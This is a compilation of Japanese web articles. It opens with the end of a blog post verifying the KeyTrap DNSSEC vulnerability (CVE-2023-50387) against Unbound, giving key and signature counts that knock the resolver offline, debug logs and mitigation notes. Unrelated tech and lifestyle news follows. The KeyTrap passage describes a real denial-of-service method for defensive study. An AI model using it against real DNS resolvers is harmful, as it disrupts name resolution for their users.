先ほどとは異なり応答しません。キャッシュにあるデータを返すだけなのですが、DNSSECの検証で忙しいようです。ただキャッシュにある場合は何度か試したらたまーに返ってきました。キャッシュにないような場合（ b.a.test など）はより処理が重いため返ってきませんでした。

今回は鍵100×署名100=10000程度にしたので上限の鍵589×署名519=305691に比べると大分少ない値で試していますが、それでも十分DoSを引き起こせました。上で説明したようにUnboundは5回リトライ処理が入るので少ない数でも十分効果的な攻撃が可能です。

対策の入ったv1.19.1でも試したところ検証の数が多すぎるとしてエラーになりました。

resolver_1 | [1708278098] unbound[1:0] debug: verify: signature mismatch resolver_1 | [1708278098] unbound[1:0] debug: verify: signature mismatch resolver_1 | [1708278098] unbound[1:0] debug: verify: signature mismatch resolver_1 | [1708278098] unbound[1:0] debug: verify sig: too many RRSIG validations resolver_1 | [1708278098] unbound[1:0] debug: rrset failed to verify, too many RRSIG validations

対策の内容としては以下で説明されていますが、やはり根本的な解決は難しく試行回数に制限を入れた緩和策となっています。

www.nlnetlabs.nl

これでリゾルバーとして動いているUnboundを容易に応答不能に出来ることが分かりました。1クエリで応答不能に追い込めるので怖いですね。もちろんマルチスレッドの場合は複数クエリを必要としますが、それでもあまりにも簡単にDNSサービスを落とせますし過去最悪の攻撃と評されるだけのことはあります。

検証用リポジトリ

今回の検証に使ったファイル一覧は以下のリポジトリにあります。

github.com

ただし、容易に攻撃に悪用されないように以下の2点だけ変更を加えています。

鍵と署名の数はそれぞれ10ずつにしている

鍵タグが衝突する鍵を探すためのスクリプトを含まない

ただそもそも実際に悪用するためにはドメインを買って親ゾーンにDSレコードを登録して、などとある程度の知識や準備が必要なのでスクリプトキディには難しいです。 逆にそれらが出来るぐらい知識がある人は衝突する鍵は簡単に生成出来るので、DNSKEY/RRSIGのレコード数を増やすのは簡単です。

覚えている限り最後にDNSSECの設定をしたのは10年前ぐらいの自分でも数時間で何とかなるレベルなので、多少の知識があれば攻撃可能という前提で動くほうが良いと思います。テクニカルレポートでも詳細な攻撃手順は書かないように配慮していましたが、とてもシンプルな脆弱性なのであまり意味がないかもしれません。それでも何もしないよりは、ということで上の変更を加えています。

余談

ネットワーク図をChatGPTに投げたらdocker-compose.ymlを生成してくれましたし、それ以外のDockerfileもほぼ全て作ってくれましたし、検証用のPythonコードも80%以上書いてくれましたし、この辺のただ無駄に時間が掛かる系のタスクを全部やってもらえるので脆弱性検証もAIのおかげで本当に楽になりました。ただブログを書いてもらう試みはあまりうまく行きませんでした。Webライターよりも先にプログラマーが失業するんだろうか。

今回の脆弱性はCPUに過剰な負荷を誘発する脆弱性でしたが、個人的にはBINDでたまに出るプロセスを一撃で殺せる脆弱性のほうが好きですしリソース枯渇攻撃よりも脅威だと思っています。ただ今回は実装依存ではなく仕様の問題ということで影響範囲が広く、かつ攻撃も容易ということで最悪と評されたのだと思います。ただリゾルバーのみ影響を受けるので、対応が必要となるのはリゾルバーを運営している組織のみということで、権威サーバーの脆弱性に比べると影響範囲はそこまで広くないかもしれません。

この脆弱性のレポートが出たのは金曜日だったのですが、週末は平日より忙しいので大変でした。家族と遊びに行って家に帰ってきて風呂入って落ち着くと0時を過ぎてる、みたいな状況ですし、そもそも日中で体力を使い果たしているので眠気もですが頭が全く働きません。今回はさすがに限界だったので"翼をさずけ"てもらいました。30代になってから深夜に翼をさずかると命の前借り感がより一層強いです。ケンガンオメガ面白い。でも命の前借り以外に時間を取る方法が思いつかないです。みんなどうやって時間を捻出してるのでしょうか。体力おばけしかいないのではないだろうか。

BINDの7つの脆弱性が公表されたあとに権威サーバに影響するやつを優先しようということでCVE-2023-4408を見ていたのですが、このとき既に睡眠を削り命の前借りを行っていました。せっかくPoCを書いたものの、まだどこにも出回っていない中で公開するのもはばかられるなと思っていたらKeyTrapの詳細が公開されました。正直「もうやめて！とっくに羽蛾のライフは0よ！」状態でしたが力を振り絞り再び見てみたところ、こっちは内容もシンプルで攻撃コードも何もないなという感じだったので、急いでペーパーを読み検証を行って先にこっちを公開することにしました。

まとめ

あまりに長い（4万文字を超えている）上にDNS関連は全然読まれないのでここには誰も到達しません。
Title: KeyTrap （CVE-2023-50387）を検証してみた - knqyf263's blog

Link: https://www.techno-edge.net/article/2024/02/19/2824.html
Content: 前回の「Google Tales」では、GoogleアシスタントがPixieという名前になればかわいいのに、という話をしたのですが、残念ながらそこまでかわいくはない「Gemini」（ジェミニ）になりました。今回はこのGeminiのお話です。

吟遊詩人の歌声は双子たちに受け継がれる

Googleのサービス名の変更は往々にしてわかりにくい（「ハングアウト」→「チャット」と「スペース」→「メッセージ」とか「G Suite」→「Google Workspace」とか）ですが、エンジンである「Gemini」搭載サービスはみんな「Gemini」になるという方針は、比較的わかりやすいかもしれません。

個人的に残念なのは、「Bard」（吟遊詩人、という意味）も「Duet AI」も「Gemini」になってしまうことです。私のBardもすぐにGeminiに変身してしまいました。

▲BardはGeminiになりました

Duet AIはともかく、吟遊詩人なんて、副操縦士（Copilot）などよりよほど夢があると思っていたので、残念。多少の間違えも「まぁ、詩人だし」と許せていたけど、Geminiだと「2人がかりで何やってるんですか」と思っちゃいそうです。

Geminiはギリシャ神話に出てくる双子、カストルとポルックスです。2人をキャラとして活かすのは難しそうですが、ばじぃさんに、旅立つ吟遊詩人を送り出す双子のイラストを描いてもらいました。

▲さようなら吟遊詩人（イラスト：ばじぃ）

Googleアシスタントも改名するのかな？

Googleアシスタントという名称が完全になくなるのかどうか、今の時点ではよくわかりませんが、少なくともサポートページには「特定の地域においては、モバイルアシスタントとしてGoogleアシスタントからGeminiに切り替えることができます」と書かれています。あ、でも起動するときは「ねぇジェミニ」じゃなくて「ねぇGoogle」のままのようです。

Gemini AdvancedでGemini Ultraを使う

Googleが2月8日に発表したのは、名称変更だけではありません。一番大きいのは、一般ユーザーがGemini Ultraを使えるようになったことです。

Geminiには「Nano」「Pro」「Ultra」の3つのサイズがあって、Ultraは最も頭がいいやつです。GoogleはOpenAIのGPT-4より賢いかも、と言ってます。

無料で使えるGeminiのエンジンはProですが、新しい有料版「Gemini Advanced」はエンジンがUltraなのです。

ChatGPTでGPT-4を使うには月額20ドル（円安な今、約3000円）のサブスク「ChatGPT Plus」への加入が必須であるのと同様、Gemini Advanvedを使うには、月額2900円の「Google One AIプレミアム」にサブスクせねばなりません。

Google Oneというのは、クラウドサービス「Googleドライブ」の有料版で、その「2TBプレミアム」プランが月額1300円のところ、このプランに加えてGemini Advancedを使えるようになるのがAIプレミアムで、月額2900円です。つまり、Gemini Advanced分は月額1600円ってことですね（Gemini Advanced単体のサブスクプランはありません）。ChatGPT Plusより安いと言えますが、ストレージは2TBもいらないなぁという人にとっては割高感があります。

▲Google Oneのプラン

私はお安いベーシックプラン（月額250円）だったのですが、仕方なくAIプレミアムにアップグレードしました。サブスクは長い目で見ると結構な負担になりますよね……。ちなみに2カ月間はお試し期間で無料です（ダウングレードするのを忘れてそのままになるような気がすごくする）。

余談ですが、ピチャイCEOは9日のXへのポストで、AIプレミアムプランで勢いづいて、Google Oneの加入者数が1億人を超えたと報告しました。

Geminiと会話してみた

アップグレードした途端、Geminiの画面がちょっとプレミアムな感じになりました。

▲プレミアムなGemini Advancedの画面

画面にもあるとおり、GeminiもBardと同様に、会話は人間のレビュアーが見ています。これは画面左下の「アクティビティ」の設定でオフにすることもできます。

せっかくAdvancedにしたので、いろいろ尋ねてみました。とはいえ、私はコーディングに詳しくないので、日常的な話題を中心に質問しました。

まずは「Googleの新サービス、Gemini Advancedを使いたくなるような紹介文を書いてください。AIについてあまり知識のない人が使ってみたくなるように！」と。すると、箇条書きを含む、かなり長い答えが返ってきました。

▲Gemini Advancedの紹介文（一部）

まあ、無難な感じです。ところが最後の「今すぐ詳細をチェック！」のURLがGoogleのGeminiではなく、Gemini Space Stationという全然違う会社のWebサイトなのでした。幻覚ってやつですね。

▲ここをチェックしてどうする

Advancedじゃない無料のGeminiに同じ質問をしたところ、参照先として正しいURLを提示してくれました。謎だ。

幻覚と自主規制

その後も、Geminiはいろんな幻覚を見せてくれました。なぜかGoogle One AIプレミアムプランはまだ日本で提供されていないと言ったり（そんなことないでしょ？と問いただしたら間違えを認めました）、その月額料金が980円だと言ったり（実際にはさっき書いたとおり2900円）。うっかり受け売りはできません。

ところで、Geminiはマルチモーダルなので、画像による質問ができます。英語でなら画像を描いてもらうこともできます。タッチの指定をしないと、基本的にフォトリアルな画像になるみたいです。

人物画も、具体的な名前（テイラー・スウィフトとか）を出さなければ、それなりに描いてくれます。ところが、ダイバーシティへの配慮が過剰なのか、例えば「A picture of a girl wearing kimono praying at a shrine」（着物を着た少女が神社にお参りしているところ）というお願いの答えがこれです。

▲確かに日本人の、とは言わなかったけども

ちなみに同じお願いをChatGPTにした結果はこれです。

▲ChatGPTでは人種を指定しなくても日本人ぽくなった

全体的に、とても慎重な性格みたいです。他にも、銅像の写真を見せて「これは誰の銅像？」と尋ねたら、「人物の画像についてはまだ対応していません」と言って、私が見せた画像も削除しちゃいました。

▲銅像の写真なのに

「モナ・リザを描いているレオナルド・ダ・ビンチ」とか「演説しているリンカーン大統領」とか、歴史上の人物でも描いてくれませんでした。ChatGPT Plusは描いてくれますが。

映画の1シーンを見せてタイトルを当てさせる、というのをやろうにも、人が映っているシーンはことごとく削除。「すずめの戸締まり」のアニメ絵でもだめ。人が映っていないシーンであれば、ちゃんと当ててくれましたが。

Geminiの旅は始まったばかり

ついついあら捜しをしてしまいましたが、Geminiはまだ始まったばかりです。どんどんよくなっていくことを期待しています。

このコラムをまるごとペーストして改善点をおうかがいしたところ、小見出しをつけてくれたり、ユーモアや個性を適度に盛り込めとアドバイスしたりしてくれました。そのうち、コラムのあらすじを投げたらいい感じに仕上げてくれるようになるかもしれません。

で、アドバイスの最後に「コラムの成功を祈っています！」って言ってくれました。応援してもらえると嬉しい。

ChatGPTに同じ質問をした結果の方が、より参考になるアドバイスだと思いましたが、成功は祈ってくれませんでした。

まだ対話を始めたばかりですが、Geminiくんは、ちょっとおくびょうなほど慎重で、相手のことを気遣える性格だと感じました。

近いうちにモバイルでも対話できるようになり、Gemini AdvancedユーザーであればGemini for Workspaceも使えるようになります。Gmailの送受信メールからタスクを作成してToDoリストにしてくれたり、ばらばらになっている1つのテーマに関するメールの情報をまとめてくれたりするそうなので、使うのが楽しみ。

そうしたデータがすべてGoogleに集められ、Geminiとのやり取りはGoogleの中の人が見る可能性があるとしても、使ってみたいです。

※なお、Googleは2月15日（米国時間）Geminiのバージョン1.5を発表しましたが、本記事はそれ以前に執筆したものです。Gemini 1.5についての解説は生成AIウィークリーの最新記事をどうぞ。
Title: さよなら吟遊詩人。Bardから双子のGeminiにバトンタッチしたGoogleのAIはどう変わったのか（Google Tales） | テクノエッジ TechnoEdge

Link: https://news.mynavi.jp/techplus/article/20240217-itengineerbook2024/
Content: 翔泳社主催のディベロッパーの祭典「Developers Summit 2024」が2月15日ベルサール羽田空港で開催された。その年のITエンジニアが業務、趣味などでおすすめしたい技術・ビジネス書をWeb投票し顕彰する「ITエンジニア本大賞2024」の最終審査プレゼン大会と大賞の授賞式が行われ、当日会場では最終ノミネートされた書籍の著者や編集者がプレゼンを行い自著のアピールを行った。

「ITエンジニア本大賞2024」の最終審査プレゼン大会にノミネートされた6冊は？

2014年より開催され今回で第11回目の開催となる「ITエンジニア本大賞2024」。対象書籍は過去の大賞受賞書籍は除き、昨年の1年でIT技術者としてお勧めする技術書・ビジネス書全般で出版社、刊行年を問わない内容となっている。技術書・ビジネス書を6冊まで選べるWeb投票を実施し、その中からベスト10に選ばれた合計20冊を選出。上位3冊の著者・編集者が最終審査としてプレゼンを行い、最後に会場でのWeb投票を経て大賞が決定される。事前のWeb投票で選出された20冊はWebページで確認できる。





2024年度最終審査に残った技術書・ビジネス書は以下の6冊となった。

●技術書部門

・「1冊ですべて身につくJavaScript入門講座」 著者:Mana(出版社:SBクリエイティブ)

・「『技術書』の読書術 達人が教える選び方・読み方・情報発信＆共有のコツとテクニック」 著者:IPUSIRON / 増井敏克 (出版社:翔泳社)

・「単体テストの考え方/使い方 プロジェクトの持続可能な成長を実現するための戦略」 著者:Vladimir Khorikov / 翻訳編集:須田智之 (出版社:マイナビ出版)

●ビジネス書部門

・「チームを動かすIT英語実践マニュアル」 著者:ラファエル・ヴィアナ (出版社:アルク)

・「何歳からでも結果が出る 本当の勉強法」 著者:望月俊孝 (出版社:すばる舎)

・「プロジェクトマネジメントの基本が全部わかる本 交渉・タスクマネジメント・計画立案から見積り・契約・要件定義・設計・テスト・保守改善まで」 著者:橋本将功 (出版社:翔泳社)

最終審査プレゼン大会の司会進行役は、クラスメソッドの高柳謙さんが担当。特別ゲストとして2023年に「良いコード / 悪いコードで学ぶ設計入門」で技術書部門大賞を受賞したスタメンの仙塲大也さんと「SCRUM BOOT CAMP THE BOOK」の著者でアトラクタの吉羽龍太郎さんを迎え、両氏がプレゼンに関するコメントや特別賞の授与を行った。

大賞に輝いた「1冊ですべて身につくJavaScript入門講座」と「チームを動かすIT英語実践マニュアル」

プレゼン終了後、会場でスマートフォンやタブレット等を使ったオンライン投票が行われ、その場で「ITエンジニア本大賞2024」の大賞と特別賞の発表と賞の授与式が行われた。大賞には技術書部門が「1冊ですべて身につくJavaScript入門講座」のManaさん、ビジネス書部門が「チームを動かすIT英語実践マニュアル」のラファエル・ヴィアナさんが選ばれた。特別賞はManaさんの「1冊ですべて身につくJavaScript入門講座」、IPUSIRONさんと増井 敏克さん共著の「『技術書』の読書術 達人が教える選び方・読み方・情報発信＆共有のコツとテクニック」が選出され、Manaさんの「1冊ですべて身につくJavaScript入門講座」は大賞と特別賞のダブル受賞となった。
Title: エンジニアが選ぶ2024年度「ITエンジニア本大賞」大賞に輝いたのは？

Link: https://gigazine.net/news/20240219-intel-benchmark-unfair-optimizations/
Content: 2024年02月19日 12時00分 メモ

Intelが特定ベンチマークのスコアを最大9％水増しする不正をしていたとして2600件以上のベンチマーク結果が事実上無効に



性能テストの標準化団体の1つで、公平なベンチマークを行うために設立された非営利組織・SPECが、「Intelが自社プロセッサのベンチマーク結果を水増しするために特定のベンチマークのスコアを向上させるような最適化を行い、スコアを最大で9％水増ししていた」として、Intelプロセッサのベンチマーク結果2600件以上を事実上無効化しました。



Targeted Intel oneAPI DPC++ Compiler Optimization Rules Out 2k+ SPEC CPU Submissions - Phoronix

https://www.phoronix.com/news/oneAPI-DPC-Compiler-Cheat-SPEC





Impact of Intel Compiler Optimizations on SPEC CPU2017 Example

https://www.servethehome.com/impact-of-intel-compiler-optimizations-on-spec-cpu2017-example-hpe-dell/





SPECは、IntelはSPECのベンチマークテストのコードとデータセットに関する事前知識を利用して、「523.xalancbmk_r」「623.xalancbmk_s 」におけるパフォーマンスを特に向上させるような適用範囲の狭いコンパイルを行っていたと指摘。



結果として、整数演算の速度が最大9％、整数演算のスループットが最大4％、向上していた可能性があるとのことです。





ニュースサイト・Phoronixは「Intel oneAPI DPC++ コンパイラー」のバージョン2022.0～2023.0が今回の不正の影響を受けることになる可能性があると伝えています。



SPECは、該当するベンチマーク結果2600件以上に対して、不正なパフォーマンス水増しが行われている旨の注記を行って事実上無効化しました。



なお、当該ベンチマークはサーバー用途などに用いられるIntel Xeon CPU向けのもので、コンパイラーのバージョンから、影響を受けるのはほとんどが第4世代Intel Xeonプロセッサー「Sapphire Rapids」だとみられます。
Title: Intelが特定ベンチマークのスコアを最大9％水増しする不正をしていたとして2600件以上のベンチマーク結果が事実上無効に

Link: https://gigazine.net/news/20240219-ev-battery-high-energy/
Content: 2024年02月19日 13時00分 乗り物

「1回の充電で1000km走る電気自動車」の実現に向けたバッテリー技術が開発される



ケイ素を用いてエネルギー密度を40％向上させるバッテリー技術が浦項工科大学校の研究チームによって開発されました。研究チームはバッテリー技術の革新によって「1回の充電で1000km走行できる電気自動車」の実現を目指しています。



Formulating Electron Beam‐Induced Covalent Linkages for Stable and High‐Energy‐Density Silicon Microparticle Anode - Je - Advanced Science - Wiley Online Library

https://onlinelibrary.wiley.com/doi/10.1002/advs.202305298





EVs that Go 1,000km on a Single Charge: Gel Makes It Possible » POSTECH

https://www.postech.ac.kr/eng/evs-that-go-1000km-on-a-single-charge-gel-makes-it-possible/



一般向けに販売されている電気自動車の航続距離は長いものでも500km前後にとどまります。日常的な運転では航続距離が500kmあれば十分な気もしますが、長距離のドライブや災害時の電力供給源としての用途を考えると航続距離が長い方が有利なのは間違いありません。





電気自動車の航続距離を長くするにはバッテリーとして使われるリチウムイオン電池のエネルギー密度向上が必要です。リチウムイオン電池のエネルギー密度向上に向けた有望な方法として「負極の材料にリチウムイオンを多く保持できるケイ素(シリコン)を使う」というアプローチが存在するのですが、シリコンには「充電中に体積が3倍以上に膨張する」という問題があります。シリコンの膨張問題は「ナノメートルクラスの微細なシリコンを使う」という方法で解決出来ますが、ナノメートルクラスのシリコン製造には複雑な製造工程と膨大なコストが必要であり、現実的ではありません。



研究チームは、マイクロメートルクラスのシリコンをゲル電解質に封入し、電子ビームを照射することでシリコンゲルとゲル電解質が共有結合した「シリコンゲル電解質」を作成。このシリコンゲル電解質を用いてバッテリーを作ることで、「従来のバッテリーと比べてエネルギー密度が40％向上しつつシリコン特有の膨張も抑えたバッテリー」の作成に成功しました。





今回の研究で開発されたバッテリー製造技術には、ナノメートルクラスのシリコンと比べて製造が容易なマイクロメートルクラスのシリコンが使われており、短期間で既存の製造プロセスへの適用が可能とのこと。研究チームは「今回の研究成果によって、私たちは高エネルギー密度リチウムイオン電池システムの構築に近づくことができました」と述べ、今後の研究開発への期待を示しています。
Title: 「1回の充電で1000km走る電気自動車」の実現に向けたバッテリー技術が開発される

Link: https://japan.cnet.com/article/35215247/
Content: 筆者は米CNETの新入り記者だ。専門は（懐かしの）テレビ。先日友人たちに「テレビで重視するものは何か」と聞いてみたが、まずは「テレビを持っているか」を聞くべきだったと反省した。現在では、そもそもテレビを持っていない友人が多い。



提供：Josh Goldman/CNET 提供：Josh Goldman/CNET

筆者はZ世代（1997年頃〜2012年頃に生まれた世代）の一員だ。筆者も友人たちも、エンターテインメントはテレビではなく、主にスマートフォンやノートPCといったパーソナルデバイスで消費してきた。ここ数年に借りた部屋を思い返しても、テレビがあった記憶はない。ルームメイトも筆者も、何かを視聴したいときはもっぱらノートPCで観ていた。

しかし、パーソナルデバイスも万能ではない。据置型ゲーム機で遊ぶために、あるいは仕事や学校でPCの画面は見飽きたという理由で、家ではテレビを使いたいと考える人もいる。それに、友人や家族とテレビ番組や映画を観るなら、小さい画面よりも大きい画面の方が都合がいい。

最近のデータを見る限り、Z世代のテレビ使用率が過去の世代よりも低いことは間違いない。しかしテレビメーカーも、若者の興味を引くような新機能をテレビに搭載しつつある。一部の専門家が指摘しているように、スマートフォンとテレビの融合が進み、例えばドラマや映画で見た商品をテレビで直接購入できるようになれば、若者がテレビを購入し、使用する動機付けになる可能性はある。



提供：Josh Goldman/CNET 提供：Josh Goldman/CNET

Z世代はテレビよりもスマートフォンでコンテンツを消費する

動画配信機材の設計・製造を手がけるBroadpeakによれば、米国、フランス、ブラジルの16～23歳を対象にした調査では、回答者の50％が番組の視聴には主にスマートフォンを使っていると回答した。次点はPCで30％、タブレットとテレビはそれぞれ10％にとどまった。

筆者は最初、これは「TikTok」や「Instagram」といった爆発的な人気を誇るソーシャルメディアはテレビでは視聴できないからだと考えていた。しかし不思議なことに、Z世代は今もかなりの時間をストリーミングコンテンツの視聴に費やしている。消費者調査会社のGWIによると、多くのZ世代は1日当たり約2時間をビデオストリーミングの視聴に費やしているという。つまり、映画やテレビ番組の消費が減っているわけではなく、視聴方法が変化しただけなのだ。

エンターテインメント／テレビ業界に特化した調査会社のHubは、「ストリーミング戦争」、つまり「どのコンテンツが消費されているか」に注目していると、「どのように消費されているか」という、さらに重要な視点を見失う恐れがあると指摘する。Hubのデータも、Broadpeakの調査結果と同様に、テレビ離れが急速に進んでいることを示している。

これはテレビメーカーやコンテンツ制作者にとって何を意味するのだろうか。

映画「ミーン・ガールズ」を23本の動画に分けてTikTokで無料公開

一部の番組制作者や映画配給会社は、スマートフォンに移行したZ世代にリーチするために変化に適応する道を選んだ。例えばParamountは映画「ミーン・ガールズ」の全編を23本の動画に分けてTikTokにアップロードした。

Hubの創業者で現在は代表を務めるJon Giegengack氏は、1日は24時間しかないため、ソーシャルメディアとストリーミング配信会社は若者の関心を奪い合っていると述べた。TikTokのようなソーシャルメディアは、何を観るかを決めるストレスがない。何も考えずにだらだらとコンテンツを観ていられるという手軽さがある。

テレビで「Netflix」を観るときは、何を観るか決めるために多少の時間をとられるとGiegengack氏は言う。それに対して、TikTokは即座にコンテンツを表示することでコンテンツの「発見プロセス」を省きつつ、独自のアルゴリズムで次に表示するコンテンツを調整している。

「TikTokのコンテンツ発見プロセスは、まさに発見プロセスがないという点で最高だと言えるかもしれない」とGiegengack氏は言う。

こうした手軽な視聴スタイルに、テレビはまだ追いつけていない。一部のストリーミングサービスは「シャッフル」モードを導入したが、ソーシャルメディアプラットフォームが提供するフリクションレスなエンターテインメントの魅力には及ばない。この機能は、すぐに満足感を得たがると言われるZ世代の特性にぴったりだ。

Z世代のテレビ購入率は低いが、この傾向は変わる可能性が高い

米国のコンシューマーテクノロジー業界団体Consumer Technology Association（CTA）のデータによると、18～26歳の若者は、上の世代よりもテレビの購入台数が大幅に少ない。米国におけるテクノロジー製品の所有状況に関する最新の調査（2023年）でも、成人全体のテレビ所有率は87％に上ったのに対し、この年齢層の若者のテレビ所有率は68％にとどまった。

こうした調査結果が示唆しているように、若い世代は総じて上の世代よりもテレビの前で過ごす時間が短い。しかし長編映画やスポーツの試合のように、テレビでの視聴が好まれるコンテンツもある。特に、複数人でコンテンツを楽しみたい場合はテレビを選ぶ人も多い。

今後1年間にテレビを購入する予定があるかという質問に対しては、18歳から26歳の若者の約3分の1が肯定的に回答した。この割合は他の世代と変わらない。この世代は今後、初めて家を買い、そこにテレビを置くことを検討する可能性が高いため、この結果は信憑性がある。

では、こうした若者がテレビに求めるものは何か。



提供：Josh Goldman/CNET 提供：Josh Goldman/CNET

スマートフォンとの連携強化（と買い物機能）がテレビの魅力を高める

CTAの調査を率いたJessica Boothe氏は、デバイス間の相互接続がさらに進むとみている。例えば1人のときはスマートフォンでコンテンツを見たい人も、友人と一緒のときはスマートフォンからテレビにキャストしたいと考えるだろう。

Appleの「AirPlay」のような画面共有・ミラーリング技術は、デバイス間の相互接続の1つの形であり、すでに広く使われている。スマートフォンやノートPCの画面をテレビにキャストするメリットは、追加のデバイスを用意する必要なく、すぐ簡単に設定できることだ。

Boothe氏はさらに、テレビのインタラクティブ機能も充実していくと見る。Eコマースやテレビから直接買い物ができるサービスの拡大はその一例だ。昔からあるインフォマーシャルを想像するかもしれないが、Boothe氏が言っているのはテレビ番組や映画に登場した商品を直接購入できる機能だ。例えば、ドラマ「エミリー、パリに行く」に登場したブーツが気に入ったら、それを直接テレビから購入できる。実際、TikTokには最近、同じような機能を持つ「Shop」タブが追加された。

「『エミリー、パリに行く』を見ていて、主人公のファッションが気に入ったら、同じ財布、同じ靴をその場で購入できるようになる」とBoothe氏は言う。

テクノロジー企業Brightlineの調査では、回答者の75％が通常のコマーシャルよりもインタラクティブなテレビ広告の方が好ましいと回答した。視聴者が求めているのは、単にパーソナライズされた広告ではない。一方的に見せられる広告ではなく、自分が能動的に関与できる広告だ。例えばスポーツの試合結果をテレビで予想するといった機能が一般的になる可能性もある。

「テレビを使って自分好みの冒険を作り上げるようなものだ」とBoothe氏は言う。

Boothe氏は、Hubの創業者と同じように、テレビが家庭の「ハブ」、つまり中心的な司令塔となって、洗濯機やRingのドアベルシステムなどを制御できるようになれば、Z世代のテレビ依存度は高まる可能性があると述べる。こうした機能を持つテレビはすでに存在する。

テレビ自体にモバイルコンテンツに適した要素を取り入れるという手もある。サムスンは数年前に、回転させると縦長の動画も表示できる薄型テレビ「Sero」を発表した。この43インチのテレビは、いわば大きなスマートフォンであり、TikTokのような縦型のソーシャルメディアコンテンツを視聴できる。サムスンによれば、Seroは「モバイル世代向けに設計」されたテレビだった。



Sero Sero

Seroはヒットこそしなかったが、その設計はデバイス間の相互接続というアイデアの核心を突くものだった。そしてデバイス間の相互接続は、今後数年間に若者が最も重視するようになると業界の専門家が予測しているものにほかならない。

現在、筆者の自宅にはテレビがある。これは前のルームメイトが引っ越したときに残していったもので、まったくの偶然だ。このテレビを観ることはめったにない。筆者はエンタメコンテンツを観るときも、実用的な作業をするときもスマートフォンを使う。もっと言えば、スマートフォンしか使わない。しかしテレビの技術や機能は進歩しつつあるため、生活の中でテレビが果たし得る役割や機能を見直しているところだ。
Title: テレビを持たない若者たち--新たな体験で変化の兆しも

Link: https://togetter.com/li/2316949
Content: 言いまつがい
Title: #事務ミス選手権 「明治36年に発注した物が来週入ってくるけど大丈夫？」「(電話で)『樹木希林の“き”です』」

Link: https://togetter.com/li/2316905
Content: 目次 生卵ライスという言葉を使った記事を投稿

かなり批判されている

何でそんな皆怒ってるのか

モキュメンタリーってやつか 生卵ライスという言葉を使った記事を投稿

かなり批判されている
Title: 「誰1人笑ってる人がいなくて怖くなっちゃったな…」ガジェット通信の『生卵ライス』という造語を用いたネタ記事が反感を買っているのは何故なのか

Link: https://nlab.itmedia.co.jp/nl/articles/2402/17/news066.html
Content: 吸音材を購入したら、ペラペラのマットが届いた話が話題になっています。一見詐欺商品をつかさまれたのかと思いますが……？

すっごい膨らんだ

この吸音材が届いたのは、X（旧Twitterユーザー）のNCコージさん（@kojiRVFNC35）。コンプレッサーの防音を強化するために購入したそうです。

NCコージさんも最初はだまされたのかと思ったそうですが、説明書に「水をつけると膨らみます」との表記が。説明書に従い水をつけてみたところ、めちゃくちゃに膨らんで立派な吸音材へと変貌しました。同じものとは思えない膨張ぶりです。

この膨張ぶりにリプライ欄などでは、「ワカメ？」「輸送しやすいような構造なんだね」「説明書を読むことの重要性」「兄貴の部屋にもこれあるけど中々に乾かすの苦戦してた」「作業場作る時に欲しい」といった声が寄せられていました。

画像提供：NCコージさん（@kojiRVFNC35）

advertisement

1|2|3 次のページへ
Title: 吸音材を注文 → ペラペラのマットが届く　だまされたのかと思ったら“予想外の変貌”をする商品だった話が話題に

Link: https://dailyportalz.jp/kiji/geometrical-romanesco
Content: あの不思議な形はいつからなのか、どのようにして育つのか、気になるので育てて確認することにした。

幾何学がなんなのかを知らないで適当に言っています。

ロマネスコという野菜をご存知だろうか。ブロッコリーとかカリフラワーに似ていて、フラクタルともいわれる独特のトゲトゲがグルグルした幾何学的な形をしている。

2022年9月13日、種を植える

ロマネスコの成長を見守るために、その種を取り寄せた。袋に書かれた種の撒き時を確認したら、温暖地とされる埼玉だと7月中旬から8月下旬、あるいは1月が適しているようだ。

今日はすでに9月中旬だが、まあ食べる分、観察する分くらいは、どうにかなるだろうと家庭菜園の畑に埋める。

「カリフラワーと同じ調理でおいしい」そうです。

種蒔きの時期が一か月遅れてしまった。

乾燥材かと思ったら、この中に種が入っているらしい。

ロマネスコの種。アブラナ科アブラナ属らしい形をしている。

いったん広告です

11月1日、ちゃんと育ってきた

種蒔きから一か月半ほどが経過。葉っぱをアオムシにやられてしまった株もあるが、おおむね順調のようである。

種が25粒しか入っていなくて少ないと思ったが、よく考えたら家庭菜園なら十分すぎる量だった。

マルチ（シート）を敷いてみました。

どれくらい間引きするべきか迷いますね。

いったん広告です

12月2日、まだ実はできない

種を植えてから収穫までは110日が目安らしい。

だいたい80日経ったが、まだ例の形は出現していないようだ。葉っぱが硬めのアブラナ科のよくある植物という感じ。

茎の真ん中にロマネスコができるはず。

いったん広告です

2023年1月10日、霜が降りた

埼玉にも霜が降りる季節となった。勝手なイメージだが、ロマネスコのようなおしゃれ野菜は、寒さに強くないような気がする。原産地は地中海沿岸と書かれているし。

明らかに凍えているようだが、収穫の日は来るのだろうか。

冬は成長を諦めて、静かに春を待っているように見える。

いったん広告です

3月2日、ロマネスコの赤ちゃんができていた

そして3月。種蒔きから半年近くが経ち、気温も少しずつ上がってくると、ロマネスコはまだ巻きの緩い春キャベツのように葉っぱを起こしてきた。

そろそろロマネスコらしさを見せてほしい。

もしかしたらとその中心部分を覗いてみると、予想以上に葉っぱが折り重なっていた。

なんだか罰当たりなことをしているような気になりつつ、その葉っぱをそっと開いてみる。

もしや、すでにロマネスコができているのでは。

おおおおお！

わーーーーー！

すごい、僅か直径1.5cmほどのロマネスコができていた。親指姫みたいだ。

そしてその姿は、この極小サイズでもまごうことなきロマネスコ。これを私は見たかったのである。もう満足。

ついでに他の株も確認してみると、すでに大きくなり始めているものも多く、一つは収穫しても良さそうなサイズにまでこっそりと育っていた。

この確認が一週間遅れていたら、あのベビーロマネスコの姿を知ることはなかっただろう。

5センチくらいになっていたロマネスコ。恐竜っぽい。

いつの間にかこんなに大きくなっちゃって。

これはブロッコリー。葉っぱのつき方が少し違うようだ。

⏩ 収穫して食べてみる
Title: ロマネスコという野菜はいつから幾何学的な形なのか

Link: https://togetter.com/li/2316667
Content: これなら沢山のLANケーブルも気にならない 頭よ x.com/MakoTr_315/sta…

天才か 俺もやろかな でも弊社のケーブル白フラットと黒フラットばっかなんだよな 勝手に買って精算したろかな x.com/MakoTr_315/sta…
Title: 研究室のネットワークに初音ミク！天才的なケーブルの使い方

Link: https://anond.hatelabo.jp/20240218160144
Content: 最近こんな感じの記事をいくつか見かけた

https://xtech.nikkei.com/atcl/nxt/column/18/00001/08910/

IT 系の人が足りないとか言う話

また、子供になりたい職業のランキング上位に IT 系が上がったみたいな話もあった

個人的にはやめたほうがいいと思う

IT 系エンジニアになりたいって思う人は基本自分が使ってるサービスとかに関わりたいと思ってるだろうけど

そういうところ行けるのって IT 系でもごく一部

自分の好きなサービスの会社とまで絞り込むと採用される人数は限られてるし、人気があるから倍率も高い

